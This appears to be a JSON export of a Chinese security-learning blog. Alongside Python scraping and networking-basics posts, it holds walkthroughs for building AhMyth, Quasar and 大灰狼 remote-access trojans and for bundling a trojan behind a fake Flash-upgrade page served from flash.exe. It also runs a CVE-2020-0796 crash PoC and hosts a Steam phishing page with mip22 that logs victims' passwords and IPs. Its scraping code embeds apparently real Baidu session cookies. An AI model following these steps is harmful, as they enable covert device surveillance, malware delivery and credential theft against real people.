btn_shuming=tk.Button(lable_shuming,command=lambda:novel5.sosuo(name_var,tree_view),text=&#x27;搜索&#x27;,bg=&#x27;#00BFFF&#x27;,fg=&#x27;#FFFFFF&#x27;,width=4,height=1,activebackground=&#x27;#00BFFF&#x27;,activeforeground=&#x27;#00BFFF&#x27;,font=(&#x27;微软雅黑&#x27;,11)) btn_shuming.pack(side=&#x27;left&#x27;,padx=10) # 创建一个选择序号的标签 lable_number=tk.Frame(root) lable_number.pack(pady=5,fill=&#x27;x&#x27;) lab_num=tk.Label(lable_number,font=(&#x27;微软雅黑&#x27;,15),text=&#x27; 选择序号&#x27;) lab_num.pack(side=&#x27;left&#x27;,padx=10) # 设置序号输入框的变量 num_var=tk.StringVar() ent_number=tk.Entry(lable_number,relief=&#x27;flat&#x27;,textvariable=num_var) ent_number.pack(side=&#x27;left&#x27;,padx=10) btn_number=tk.Button(lable_number,command=lambda:novel5.down(num_var,root),text=&#x27;下载&#x27;,bg=&#x27;#00BFFF&#x27;,fg=&#x27;#FFFFFF&#x27;,width=4,height=1,activebackground=&#x27;#00BFFF&#x27;,activeforeground=&#x27;#00BFFF&#x27;,font=(&#x27;微软雅黑&#x27;,11)) btn_number.pack(side=&#x27;left&#x27;,padx=10) # 设置搜索显示表 columns=(&#x27;novle_id&#x27;,&#x27;novle_name&#x27;,&#x27;novle_author&#x27;,&#x27;novle_address&#x27;) tree_view=ttk.Treeview(root,height=18,columns=columns,show=&#x27;headings&#x27;) # 设置每列格式 tree_view.column(&#x27;novle_id&#x27;,width=25,anchor=&#x27;center&#x27;) tree_view.column(&#x27;novle_name&#x27;,width=55,anchor=&#x27;center&#x27;) tree_view.column(&#x27;novle_author&#x27;,width=40,anchor=&#x27;center&#x27;) tree_view.column(&#x27;novle_address&#x27;,width=40,anchor=&#x27;center&#x27;) # 设置每列表头 tree_view.heading(&#x27;novle_id&#x27;,text=&#x27;序号&#x27;) tree_view.heading(&#x27;novle_name&#x27;,text=&#x27;书名&#x27;) tree_view.heading(&#x27;novle_author&#x27;,text=&#x27;作者&#x27;) tree_view.heading(&#x27;novle_address&#x27;,text=&#x27;下载地址&#x27;) tree_view.pack(side=&#x27;left&#x27;,fill=&#x27;both&#x27;,expand=True) return root 点击按钮后，将输入框的值发送给novel5执行 7，主方法，创建novel5.py，在该方法中将之前的功能串联起来： 123456789101112131415161718192021222324252627282930313233343536373839404142434445# 主方法import novel4import novel3import novel2import tkinter as tkif __name__ == &#x27;__main__&#x27;: path=&#x27;&#x27; root=novel4.get_window() root.mainloop()# 点击搜索def sosuo(name_var,tree_view): name=name_var.get() global novels_info novels_info=novel3.search(name) # 插入novels_info中的数据 for i, novel_info in enumerate(novels_info): values = [i, novel_info[&#x27;name&#x27;], novel_info[&#x27;author&#x27;], novel_info[&#x27;address&#x27;]] tree_view.insert(&#x27;&#x27;, &#x27;end&#x27;, values=values) # 在主窗口上弹出新窗口def open_new_window(message,root): new_window = tk.Toplevel(root) new_window.title(&quot;小说下载器&quot;) new_window.geometry(&quot;350x100+650+400&quot;) label = tk.Label(new_window, text=message) label.pack()# 点击下载def down(num_var,root): num=int(num_var.get()) try: if num&lt;0 or num&gt;len(novels_info): message=&#x27;输入的序号错误！&#x27; open_new_window(message,root) else: address = &#x27;http://www.yetianlian.cc&#x27;+novels_info[num][&#x27;address&#x27;] novel2.get_novel(address) message=&#x27;下载完成！\\n 小说下载到：&#x27;+path open_new_window(message,root) except: message=&#x27;下载失败！&#x27; open_new_window(message,root) 8,运行效果 搜索功能： 下载功能： 下载的文件： 9，打包为exe可执行文件cmd 进入项目的文件夹内 123456pyinstaller -D -w -i box.ico -n &quot;小说下载器&quot; novel5.py-D 表示打包为文件夹-w 表示可在Windows系统中使用-i box.ico 表示选择当前文件夹下的box.ico图片当做程序的图标-n &quot;小说下载器&quot; 表示程序的名称为：小说下载器novel5.py 该项目的主程序入口 打包完成为：build,dist两个文件夹 其中exe程序就在dist的文件夹下 至此，整个python爬虫的小说下载器项目就制作完成！","categories":[],"tags":[]},{"title":"二十四，Proxifier和Wireshark的使用","slug":"二十四，Proxifier和Wireshark的使用","date":"2023-12-05T11:23:38.000Z","updated":"2023-12-05T12:09:31.262Z","comments":true,"path":"2023/12/05/二十四，Proxifier和Wireshark的使用/","permalink":"http://example.com/2023/12/05/%E4%BA%8C%E5%8D%81%E5%9B%9B%EF%BC%8CProxifier%E5%92%8CWireshark%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"一，Proxifier的使用​ Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。 1，下载安装Proxifier，官网地址为：https://www.proxifier.com/ 2，双击运行Proxifier 3，点击配置文件—&gt;点击代理服务器—&gt;点击添加—&gt;地址填127.0.0.1—&gt;端口填自己代理的端口—&gt;选中SOCKES 版本 5—&gt;点击确定—&gt;点击确定 4，点击配置文件—&gt;点击代理规则—&gt;点击添加—&gt;名称随意填—&gt;应用程序填想要添加代理的程序或服务，例如：ssh*;—&gt;点击确定—&gt;移除Location—&gt;将Default的最后一格改为Direct—&gt;点击确定 5，打开命令提示符，输入：ssh &#x72;&#x6f;&#x6f;&#x74;&#64;&#49;&#x2e;&#49;&#x2e;&#x31;&#x2e;&#x31;，返回Proxifier出现以下效果，说明代理成功 二，Wireshark的使用​ WireShark是非常流行的网络封包分析工具，可以截取各种网络数据包，并显示数据包详细信息。常用于开发测试过程中各种问题定位。 1，下载WireShark，官网地址为：https://www.wireshark.org/ 下载时能勾上下载的插件全部都要勾上下载下来，包括其中的Npcap和USBPcap组件 2，找到本机的网卡并双击选择 3，打开命令提示符，输入ping 192.168.2.56,发送和接收四个数据包 4，在WireShark中点击停止，停止监控数据包 5，在搜索框中输入icmp，查看ping的数据包 6.，在搜索框中输入ip.src&#x3D;&#x3D;192.168.2.96则可以查看源地址为192.168.2.96的数据包 输入ip.dst&#x3D;&#x3D;192.168.2.56则可以查看目标地址为192.168.2.56的数据包","categories":[],"tags":[]},{"title":"二十三，网络基础","slug":"二十三，网络基础","date":"2023-12-04T11:54:11.000Z","updated":"2023-12-10T07:32:44.616Z","comments":true,"path":"2023/12/04/二十三，网络基础/","permalink":"http://example.com/2023/12/04/%E4%BA%8C%E5%8D%81%E4%B8%89%EF%BC%8C%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/","excerpt":"","text":"1，正向shell和反弹shell​ 正向shell是指攻击者在目标主机上成功安装了一个后门程序，使其能够通过网络与目标主机进行远程通信和控制。攻击者可以通过正向shell执行各种操作，如上传、下载、修改文件、执行命令等。 ​ 反弹shell是指攻击者通过在目标主机上成功执行一个恶意代码，然后利用该恶意代码与自己的主机建立连接，从而实现对目标主机的远程控制。攻击者可以利用反弹shell执行各种攻击，如窃取敏感信息、操纵目标主机等。 示意图如下： 2，ipv4的组成：网络部分（NETWORK）+主机部分（HOST） 比如： 192.168.1.142 网络部分为[192.168.1] 主机部分[142] 问：255.255.255.255&#x2F;30有多少个可分配的主机地址，分别是什么，其他的为什么不可用 答：对于IP地址块255.255.255.255&#x2F;30，它是一个包含4个连续IP地址的子网。 其中，两个IP地址是网络地址和广播地址，不能用于分配给主机。剩下的两个IP地址可用于分配给主机。 具体地，该子网的可分配的主机地址为： 网络地址：255.255.255.252 (不可用) 第一个可用主机地址：255.255.255.253 第二个可用主机地址：255.255.255.254 广播地址：255.255.255.255 (不可用) 其中，网络地址和广播地址是保留地址，不能用于主机的分配。而第一个可用主机地址和第二个可用主机地址可以用于分配给主机使用。 需要注意的是，&#x2F;30 子网掩码只允许分配两个可用主机地址，因为它使用了30位来标识网络，只留下了2个位用于主机地址。 3，公网地址和私网地址：公有网络地址分为A，B，C，D，E五类 其中A，B，C三类为常用地址，D类地址用于组播通信的地址，E类地址用于科学研究的保留地址 私有网络地址分为A，B，C三类 4，OSI模型​ OSI（Open System Interconnect），即开放式系统互连。该体系结构标准定义了网络互连的七层框架 ​ OSI是逻辑模型，而非物理模型，它是一组指导原则，开发人员可据此来开发网络中运行的应用程序，它还提供了一个框架，可用于指导如何制作和实施网络标准，如何制造设备以及如何制定网络互联档案。 参考模型的优点： 将网络通信过程划分成更小，更简单的组件，这有助于组件的开发，设计和故障排除。 通过标准化网络部件，让多家厂商能够协作开发。 明确定义了模型每层执行的功能，从而支持行业标准化。 让不同类型的网络硬件和软件能够彼此通信。 防止对一层的修改影响其他层，从而避免了开发工作的影响。 OSI七层架构及各层作用： 物理层（Physical Layer）：负责传输比特流，并管理物理连接、电压等物理特性。数据链路层（Data Link Layer）：在相邻节点之间传输数据帧，并提供错误检测和纠正的功能。网络层（Network Layer）：负责在网络中选择路由并转发数据包，例如IP协议。传输层（Transport Layer）：提供端到端的数据传输服务，并确保数据的可靠性和完整性，例如TCP协议。会话层（Session Layer）：管理通信会话的建立、维护和终止。表示层（Presentation Layer）：负责数据的格式化、加密和解密，以确保不同系统之间的数据交换。应用层（Application Layer）：提供特定应用程序的服务，例如HTTP、FTP、SMTP等。 5，路由器路由器的定义：是实现网络互连设备，工作在网络层路由器的功能：路由和转发1）可以决定数据包从来源端到目的端所经过的路由路径（host到host之间的最佳传输路径），这个过程称为路由；2）将路由器输入端的数据包移送至适当的路由器输出端（在路由器内部进行），这称为转发。路由器和交换机的区别？交换机是查看MAC地址表的，路由器是查看路由表的。交换机如果没有在MAC地址表中找到自己想要的，它就要进行区域泛洪，而路由器如果在路由表中找不到对应的条目会直接丢弃数据包，并返回一个不可到达的信息。他不会发送广播，所以路由器有隔离广播域的功能而交换机所在的网络内部就是一个广播域，他只在本区域泛洪，不会泛红到路由器外面；且交换机工作在二层，根据MAC地址表转发数据帧，路由器工作在三层，根据路由表转发数据包，交换机一般工作在据域网内，而路由器工作在广域网。 内网从路由器获取ip地址分为静态自动和动态（dhcp）手动两种动态获取的ip在电脑关机时回收，下次启用时重新分发当静动态都设为同一ip时，能不能上网和路由器的优先有关，一般时静态优先","categories":[],"tags":[]},{"title":"二十二，安卓手机远控AhMyth","slug":"二十二，安卓手机远控AhMyth","date":"2023-12-04T11:12:59.000Z","updated":"2023-12-04T11:47:00.739Z","comments":true,"path":"2023/12/04/二十二，安卓手机远控AhMyth/","permalink":"http://example.com/2023/12/04/%E4%BA%8C%E5%8D%81%E4%BA%8C%EF%BC%8C%E5%AE%89%E5%8D%93%E6%89%8B%E6%9C%BA%E8%BF%9C%E6%8E%A7AhMyth/","excerpt":"","text":"AhMyth是一款在GitHub上开源的能控制安卓手机的远程控制软件 项目地址为：https://github.com/AhMyth/AhMyth-Android-RAT 接下来进行进行控制操作： 1，下载好AhMyth双击打开 2，点击APK Builder—&gt;在Source IP中输入本机的IP地址—&gt;Source Port可以不用填，默认端口—&gt;点击Builder生成apk木马 3，根据生成的地址找到apk木马 4，在AhMyth中点击Victims，再点击Listen开启监听 5，打开手机模拟器，将生成的Ahmyth.s.apk拖到模拟器中，双击运行，返回Ahmyth若出现以下效果，则证明远控成功 6，点击Open The Lab可打开操作面板 7，其中各个按钮皆有不同的功能 Camera:开启手机的前置或后置摄像头进行拍照 File Manager:文件管理器 Mic:可开启麦克风进行录音 Location:地址定位功能 contacts:通讯录 SMS:发送短信 Calls Logs:查看通话记录","categories":[],"tags":[]},{"title":"二十一，python爬虫基础","slug":"二十一，python爬虫基础","date":"2023-12-03T03:15:18.000Z","updated":"2023-12-03T06:24:58.758Z","comments":true,"path":"2023/12/03/二十一，python爬虫基础/","permalink":"http://example.com/2023/12/03/%E4%BA%8C%E5%8D%81%E4%B8%80%EF%BC%8Cpython%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/","excerpt":"","text":"爬虫概念：使用程序模拟浏览器，向服务器发送请求，获取响应数据通过国内镜像地址下载urllib包： 1pip install urllib -i https://mirrors.huaweicloud.com/pypi/simple/ 第一个爬虫程序：12345678910# 导入urllib包import urllib.request# 定义访问的地址url=&quot;http://www.baidu.com&quot;# 模拟浏览器向服务器发送请求，获取response响应response=urllib.request.urlopen(url)# 获取响应中的页面源码，并设置utf-8编码connest=response.read().decode(&#x27;utf-8&#x27;)# 打印页面源码print(connest) 其中read方法可以用其他方法替换：read()一个字节一个字节的读 readline()读取一行 readlines()读取所有行 getcode()获取状态码 geturl()获取URL地址 getheaders()获取状态信息 urllib下载数据12url1=&quot;http://www.baidu.com&quot;urllib.request.urlretrieve(url1,&#x27;baidu.html&#x27;) 其中url1可以设置页面，图片，视频的地址 UA反爬有些网页具有UA反爬设置，可以在程序中设置headers进行防反爬 123456header=&#123; &#x27;User-Agent&#x27;:&#x27; Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 SLBrowser/9.0.0.10191 SLBChan/11&#x27;&#125;request=urllib.request.Request(url=url,headers=header)response=urllib.request.urlopen(request)conest=response.read().decode(&#x27;utf-8&#x27;) 其中header的内容可以在浏览器中的控制台–&gt;Network–&gt;all–&gt;Name中选择数据–&gt;Headers–&gt;Request Headers get请求的quote方法当get请求的参数是中文时，要将之转化为浏览器可以识别的参数，就需要用要quote方法 123url=&#x27;https://www.baidu.com/s?wd=&#x27;name=urllib.parse.quote(&#x27;猫&#x27;)url=url+name 绕过百度安全验证当用爬虫爬取百度搜索的数据时，可能会遇到百度安全验证的问题，可以在headers中设置User-Agent，Cookie和Accept来绕过 12345header = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36 Edg/83.0.478.50&#x27;, &#x27;Cookie&#x27;:&#x27;BDUSS_BFESS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; H_WISE_SIDS_BFESS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; BAIDUID_BFESS=5F6D6603BD12746091D57F3B00271E14:FG=1; ZFY=EIjY8scX6onNHxN7L0gc:AlgR2fdPGOCkedx3Wllh2uw:C&#x27;,#自己先在浏览器登录百度账号 &#x27;Accept&#x27;:&#x27;image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8&#x27;&#125; post请求post请求与get请求方式不同，请求参数不是拼接的形式，要对请求参数进行处理，再定制请求 123456data=&#123; &#x27;kw&#x27;:&#x27;so&#x27;&#125;# post请求的参数必须要进行编码data=urllib.parse.urlencode(data).encode(&#x27;utf-8&#x27;)request=urllib.request.Request(url=url,headers=header,data=data) 将str类型变为json对象先导入json包，后使用loads方法 12import jsonobi=json.loads(contect) get请求豆瓣电影，保存数据为json文件1234567891011121314151617181920212223242526272829303132333435363738394041424344# @Describe:get请求豆瓣电影，保存前10页数据import urllib.parseimport urllib.requestdef get_request(page): base_url =&#x27;https://movie.douban.com/j/chart/top_list?type=24&amp;interval_id=100%3A90&amp;action=&amp;&#x27; data=&#123; &#x27;start&#x27;:(page-1)*20, &#x27;limit&#x27;:20 &#125; data=urllib.parse.urlencode(data) url=base_url+data print(url) header=&#123; &#x27;Accept&#x27;: &#x27;application/json, text/javascript, */*; q=0.01&#x27;, &#x27;Cookie&#x27;: &#x27;BIDUPSID=4722B19FFA1551DBBC67EFB7A68BF304; PSTM=1654602249; REALTIME_TRANS_SWITCH=1; FANYI_WORD_SWITCH=1; HISTORY_SWITCH=1; SOUND_SPD_SWITCH=1; SOUND_PREFER_SWITCH=1; MCITY=-261%3A318%3A; BAIDUID=5F6D6603BD12746091D57F3B00271E14:FG=1; BDUSS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; BDUSS_BFESS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; APPGUIDE_10_6_5=1; APPGUIDE_10_6_6=1; APPGUIDE_10_6_7=1; newlogin=1; APPGUIDE_10_6_9=1; H_WISE_SIDS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; H_PS_PSSID=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; H_WISE_SIDS_BFESS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; BAIDUID_BFESS=5F6D6603BD12746091D57F3B00271E14:FG=1; Hm_lvt_64ecd82404c51e03dc91cb9e8c025574=1701173106,1701241794,1701248955,1701307912; Hm_lpvt_64ecd82404c51e03dc91cb9e8c025574=1701307912; ab_sr=1.0.1_MjMxMmVhNDhhZjY3NDU1ODI4OWQ5MjlmZjZkN2VhN2M3MDJkYzdhMGE4OTFlOWY3Y2I0ZDhiZjViYmRhNDgyMjk4NGM5MTVkYzI4MTg1N2U3MTlhODI0MGZkYmFkOGQ3Y2Y4MGQ3ZDdhZjU3MTgwMTE2MzUyMWQ1YTNjOGUzZDI0NTY0MzJjZjFjMDhhOGUxMTYyODIwZDQ1NGE2MmRiNWY3OGRmNTQ4OWQ4ODM0NDk0NTI0NDhkZTRjNThkYTQ2&#x27;, &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 SLBrowser/9.0.0.10191 SLBChan/11&#x27; &#125; request=urllib.request.Request(url=url,headers=header) return requestdef get_contect(request): response=urllib.request.urlopen(request) contect=response.read().decode(&#x27;utf-8&#x27;) return contectdef down_load(page,contect): json_name=&#x27;./doban/doban&#x27;+str(page)+&#x27;.json&#x27; with open(json_name,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as fp: fp.write(contect) fp.close()# 程序入口if __name__ == &quot;__main__&quot;: start_page=int(input(&quot;请融入起始页：&quot;)) end_page=int(input(&quot;请输入结尾页：&quot;)) if(start_page&lt;1 or end_page&lt;start_page): print(&quot;输入错误！&quot;) else: for page in range(start_page, end_page+1): request=get_request(page) contect=get_contect(request) down_load(page,contect) print(&quot;下载豆瓣电影名称&quot;+str(start_page)+&quot;~&quot;+str(end_page)+&quot;页完成！&quot;) 第33行作用：当当前脚本被直接运行时，执行下面的代码块；当当前脚本被导入到其他脚本中时，不执行下面的代码块。这种写法通常用于确保某个模块或脚本在作为主程序运行时才执行某些操作，而在被导入时不执行这些操作。 第10行作用：将data中的属性值以&amp;连接起来 post请求KFC，保存前10页数据1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# @Describe:post请求KFC，保存前10页数据import urllib.parseimport urllib.requestdef get_request(page): url =&#x27;http://www.kfc.com.cn/kfccda/ashx/GetStoreList.ashx?op=cname&#x27; data=&#123; &#x27;cname&#x27;: &#x27;北京&#x27;, &#x27;pid&#x27;:&#x27;&#x27; , &#x27;pageIndex&#x27;: page, &#x27;pageSize&#x27;: 10 &#125; data=urllib.parse.urlencode(data).encode(&#x27;utf8&#x27;) header=&#123; &#x27;Accept&#x27;: &#x27;application/json, text/javascript, */*; q=0.01&#x27;, &#x27;Cookie&#x27;: &#x27;BIDUPSID=4722B19FFA1551DBBC67EFB7A68BF304; PSTM=1654602249; REALTIME_TRANS_SWITCH=1; FANYI_WORD_SWITCH=1; HISTORY_SWITCH=1; SOUND_SPD_SWITCH=1; SOUND_PREFER_SWITCH=1; MCITY=-261%3A318%3A; BAIDUID=5F6D6603BD12746091D57F3B00271E14:FG=1; BDUSS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; BDUSS_BFESS=HJlUk1lRmhpV0NQY090SXVrWUpHYVBLMDJyN0trbG5TUnBZdHB4QmsyT3pqZzlsSVFBQUFBJCQAAAAAAQAAAAEAAAAs7BUgZGZnZ2dnZmZmdGcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALMB6GSzAehke; APPGUIDE_10_6_5=1; APPGUIDE_10_6_6=1; APPGUIDE_10_6_7=1; newlogin=1; APPGUIDE_10_6_9=1; H_WISE_SIDS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; H_PS_PSSID=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; H_WISE_SIDS_BFESS=39635_39647_39664_39676_39713_39733_39740_39780_39703_39684_39661_39679_39841; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; BAIDUID_BFESS=5F6D6603BD12746091D57F3B00271E14:FG=1; Hm_lvt_64ecd82404c51e03dc91cb9e8c025574=1701173106,1701241794,1701248955,1701307912; Hm_lpvt_64ecd82404c51e03dc91cb9e8c025574=1701307912; ab_sr=1.0.1_MjMxMmVhNDhhZjY3NDU1ODI4OWQ5MjlmZjZkN2VhN2M3MDJkYzdhMGE4OTFlOWY3Y2I0ZDhiZjViYmRhNDgyMjk4NGM5MTVkYzI4MTg1N2U3MTlhODI0MGZkYmFkOGQ3Y2Y4MGQ3ZDdhZjU3MTgwMTE2MzUyMWQ1YTNjOGUzZDI0NTY0MzJjZjFjMDhhOGUxMTYyODIwZDQ1NGE2MmRiNWY3OGRmNTQ4OWQ4ODM0NDk0NTI0NDhkZTRjNThkYTQ2&#x27;, &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 SLBrowser/9.0.0.10191 SLBChan/11&#x27; &#125; request=urllib.request.Request(url=url,headers=header,data=data ) print(page) return requestdef get_contect(request): response=urllib.request.urlopen(request) contect=response.read().decode(&#x27;utf-8&#x27;) return contectdef down_load(page,contect): json_name=&#x27;./kfc/kfc_&#x27;+str(page)+&#x27;.json&#x27; with open(json_name,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as fp: fp.write(contect) fp.close()# 程序入口if __name__ == &quot;__main__&quot;: start_page=int(input(&quot;请融入起始页：&quot;)) end_page=int(input(&quot;请输入结尾页：&quot;)) if(start_page&lt;1 or end_page&lt;start_page): print(&quot;输入错误！&quot;) else: for page in range(start_page, end_page+1): request=get_request(page) contect=get_contect(request) down_load(page,contect) print(&quot;下载kfc店铺&quot;+str(start_page)+&quot;~&quot;+str(end_page)+&quot;页完成！&quot;)","categories":[],"tags":[]},{"title":"二十，网页注入捆绑木马","slug":"二十，网页注入捆绑木马","date":"2023-11-29T12:36:24.000Z","updated":"2023-11-29T13:06:21.920Z","comments":true,"path":"2023/11/29/二十，网页注入捆绑木马/","permalink":"http://example.com/2023/11/29/%E4%BA%8C%E5%8D%81%EF%BC%8C%E7%BD%91%E9%A1%B5%E6%B3%A8%E5%85%A5%E6%8D%86%E7%BB%91%E6%9C%A8%E9%A9%AC/","excerpt":"","text":"1，先制作一个flash页面加入flash升级弹窗 下载好flash.js文件，先制作一个简单页面在body标签中加入以下代码 1&lt;script src=&quot;./flash.js&quot;&gt;&lt;/script&gt; 效果如下： 2，制作捆绑木马 将flashcenter_pp_ax_install_cn.exe安装包和flag.exe木马放在同一文件夹下 使⽤winrar选中两个文件创建压缩⽂件 选中 创建自解压格式压缩文件 ⾼级-&gt;⾼级⾃解压选项，路径设置 C:\\windows\\temp 在设置添加C:\\windows\\temp\\flashcenter_pp_ax_install_cn.exeC:\\windows\\temp\\flag.exe 模式设置全部隐藏 更新设置 在最后点击确定，点击生成 3，替换图标 先下载Restorator.rar文件并进行解压 双击Restorator.exe运行 将Desktop.exe和flashcenter_pp_ax_install_cn.exe都拖到Restorator的资源数中 将Desktop.exe的图标删除，将flashcenter_pp_ax_install_cn.exe的图标复制黏贴到Desktop.exe中 点击保存退出并将Desktop.exe重命名为flash.exe 4，将捆绑木马放到网页中 先将flash.exe放到网站根目录中 并在flash.js的最后改为 1http://192.168.2.96/flash.exe 其中192.168.2.96为本机的IP地址，flash.exe为改好的安装包文件 在网页中点击立即升级，开始下载flash.exe文件说明放入捆绑木马成功","categories":[],"tags":[]},{"title":"十九，Quasar远控的安装及使用","slug":"十九，Quasar远控的安装及使用","date":"2023-11-29T12:18:35.000Z","updated":"2023-11-29T12:32:02.435Z","comments":true,"path":"2023/11/29/十九，Quasar远控的安装及使用/","permalink":"http://example.com/2023/11/29/%E5%8D%81%E4%B9%9D%EF%BC%8CQuasar%E8%BF%9C%E6%8E%A7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8/","excerpt":"","text":"1，关闭系统中所有的杀毒软件与防火墙 2，下载Quasar最新内部成员汉化版远控工具.rar并解压 3，双击运行Quasar_zh-CHS.exe 4，开启监听端口 点击设置—&gt;选择端口4782—&gt;点击Start Listening—&gt;保存 5，生成控制程序，点击生成进行以下设置 点击生成，成功生成程序Client-built.exe 6，将程序Client-built.exe拖到虚拟机中双击运行 7，右键管理可以进行多种操作 8，点击断开可以退出远程控制","categories":[],"tags":[]},{"title":"十八，大灰狼远控软件的使用","slug":"十八，大灰狼远控软件的使用","date":"2023-11-28T12:17:53.000Z","updated":"2023-11-28T12:34:26.554Z","comments":true,"path":"2023/11/28/十八，大灰狼远控软件的使用/","permalink":"http://example.com/2023/11/28/%E5%8D%81%E5%85%AB%EF%BC%8C%E5%A4%A7%E7%81%B0%E7%8B%BC%E8%BF%9C%E6%8E%A7%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"1，下载下载DHLv9.5.zip并进行解压 2，双击运行大灰狼远程管理软件 V9.5.exe文件 3，点击服务生成，在域名IP中输入本机的IP地址，并点击生成服务 4，将生成的Server.exe文件拖到虚拟机中双击运行后返回大灰狼管理软件 出现以上结果表示远控成功，可以右键进行多种操作 python在执行程序时发现缺少某种包，则可用以下命令进行导入： 1pip install chardet -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com","categories":[],"tags":[]},{"title":"十七，永恒之黑和简单钓鱼页面","slug":"十七，永恒之黑和简单钓鱼页面","date":"2023-11-28T11:45:01.000Z","updated":"2023-11-28T12:16:08.933Z","comments":true,"path":"2023/11/28/十七，永恒之黑和简单钓鱼页面/","permalink":"http://example.com/2023/11/28/%E5%8D%81%E4%B8%83%EF%BC%8C%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E5%92%8C%E7%AE%80%E5%8D%95%E9%92%93%E9%B1%BC%E9%A1%B5%E9%9D%A2/","excerpt":"","text":"一，永恒之黑的简单复现1，先对Windows系统是否存在永恒之黑进行进行检测 从http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip 这个网址下载检测工具 执行以下命令： 1CVE-2020-0796-Scanner.exe 192.168.2.128 若出现以下效果则证明存在永恒之黑漏洞 2，其次是对永恒之黑漏洞进行复现攻击 从https://github.com/eerykitty/CVE-2020-0796-PoC 下载攻击工具 执行以下命令： 1python3 CVE-2020-0796.py 192.168.2.128 若Windows系统的虚拟机出现蓝屏则证明对永恒之黑漏洞的攻击复现成功 二，钓鱼页面的简单制作 1，先在kali系统中开代理 1vi /etc/proxychains4.conf 进入配置文件中进行修改，修改最后一行为以下内容并保存退出 1socks5 192.168.2.44 7897 中间的数字为本机IP，后面的数字为代理端口 2，下载mip22 进入桌面，在命令窗口中执行以下命令进行下载 1proxychains4 git clone https://github.com/makdosx/mip22 3，生成钓鱼页面 进入mip22文件夹 1cd /home/kali/Desktop/mip22 给mip22增加执行权限 1chmod +x ./* 执行mip22，开始生成钓鱼页面 1proxychains4 -q bash ./mip22.sh 选择1默认配置页面 选择51，steam游戏平台的模板 选择3 Cloudflard，使其他用户在其他电脑也可以查看 其中https的网址就是生成的钓鱼页面了 https://remaining-img-questions-less.trycloudflare.com 在mip22文件夹中的data.txt保存着在钓鱼页面中输入的账号和密码 在fingerprints.txt中保存着在钓鱼页面中尝试登录的用户的IP地址","categories":[],"tags":[]},{"title":"十六，sql注入的简单使用","slug":"十六，sql注入的简单使用","date":"2023-11-23T11:10:10.000Z","updated":"2023-11-23T12:12:30.000Z","comments":true,"path":"2023/11/23/十六，sql注入的简单使用/","permalink":"http://example.com/2023/11/23/%E5%8D%81%E5%85%AD%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/","excerpt":"","text":"1，搭建Pikachu漏洞练习平台先解压pikachu-master.zip文件至先前搭建的网站根目录，再打开pikachu\\inc目录下的config.inc.php 文件，并将第11行代码改为： 1define(&#x27;DBPW&#x27;, &#x27;root&#x27;); 保存后复制黏贴为config.inc文件 打开网址：http://192.168.2.31/pikachu/ 便可进入PIkachu漏洞联系平台 